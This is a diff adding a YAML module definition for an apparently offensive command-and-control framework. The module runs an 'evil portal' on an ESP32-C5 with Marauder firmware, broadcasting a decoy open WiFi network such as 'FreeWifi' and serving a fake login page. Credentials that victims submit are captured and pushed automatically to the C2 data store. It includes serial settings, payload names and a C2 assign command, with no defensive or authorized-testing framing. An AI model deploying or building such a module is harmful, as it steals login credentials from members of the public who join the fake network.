@@ -1,0 +1,34 @@
+name: Evil Portal (ESP32-C5 / Marauder)
+description: >
+  Deploys a captive portal via ESP32-C5 using the ESP32 Marauder
+  'evilportal' command over serial. The portal hosts a fake login page
+  and captures submitted credentials, which stream to the C2 data store
+  under category 'portals'. ESP32-C5 provides dual-band WiFi 6
+  (2.4GHz + 5GHz) for broader target coverage.
+icarus: C
+requires:
+  - ESP32-C5 running Marauder firmware (or compatible evil portal firmware)
+  - Serial connection to TMS at /dev/ttyUSB0 or /dev/ttyACM0
+  - Marauder firmware with evilportal support
+options:
+  serial_port: /dev/ttyUSB0
+  baud: "115200"
+  ssid: FreeWifi
+  portal_type: login
+  channel: "6"
+payloads:
+  - start_portal
+  - stop_portal
+  - list_captures
+notes: >
+  The ESP32-C5 supports IEEE 802.11ax (WiFi 6) at both 2.4GHz and 5GHz,
+  making it more capable than C3/S3 variants for evil portal deployments.
+  Marauder C5 firmware support may be limited — check justcallmekoko's
+  repo for the latest C5 build. If unavailable, a lightweight MicroPython
+  captive portal can run directly on the C5.
+
+  Assign via C2:
+    assign <session_id> evil_portal {"ssid":"GuestNetwork","channel":"6"}
+
+  Credentials captured on the ESP32 are relayed via TMS serial and
+  pushed to the C2 data store automatically.
